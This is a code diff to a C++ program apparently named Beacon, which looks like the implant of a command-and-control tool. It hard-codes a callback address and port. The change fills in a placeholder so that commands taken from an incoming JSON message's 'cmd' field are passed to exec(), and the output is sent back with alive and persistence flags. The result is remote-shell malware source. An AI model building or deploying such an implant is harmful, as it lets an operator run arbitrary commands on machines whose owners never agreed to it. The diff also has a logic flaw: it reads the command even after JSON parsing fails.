@@ -1,3 +1,6 @@
+int beacon_id = 0;
+int beacon_port = 8000;
+const char *beacon_ip_addr = "127.0.0.1";
 #include <iostream>
 #include <string>
 #include <tuple>
@@ -9,8 +12,11 @@
 #include <cmds.hpp>
 #include <nlohmann/json.hpp>
 #include <include/beacon.hpp>
+#include <array>
 
 using json = nlohmann::json;
+
+Cmdline cmdline("","");
 
 Beacon::Beacon(int bid, int bport, const char *b_attached_to)
 {
@@ -76,20 +82,21 @@ void Beacon::await_update()
 }
 
 std::string Beacon::respond(std::string buf){
-    int status;
+    int status = 100;
     std::string cout;
-    bool alive;
-    bool persistent;
+    bool alive = true;
+    bool persistent = establish();
     json update;
     try {
         update = json::parse(buf);
     }
     catch (...){
         cout = "error parsing json for " + buf;
-        return;
+        status = 300;
     }
     /// COMMAND LINE EXECUTION GOES HERE ///
-
+    std::string cmd = update["cmd"];
+    cout = exec(cmd.c_str());
     ////////////////////////////////////////
     return set_update(status, cout, alive, persistent);
 }
@@ -101,6 +108,7 @@ bool Beacon::establish(){
 std::string Beacon::set_update(int status, std::string cout, bool alive, bool persistent){
     json j;
     std::string k;
+    j["id"] = id;
     j["status"] = status;
     j["cout"] = cout;
     j["alive"] = alive;
@@ -114,9 +122,6 @@ std::string Beacon::set_update(int status, std::string cout, bool alive, bool pe
 int main()
 {
     Beacon beacon(beacon_id, beacon_port, beacon_ip_addr);
-    int status = 100;
-    std::string cout;
-    bool alive = true;
-    bool persistent = beacon.establish();
+    cmdline.sethelp("help","display this help message");
     beacon.await_update();
 }
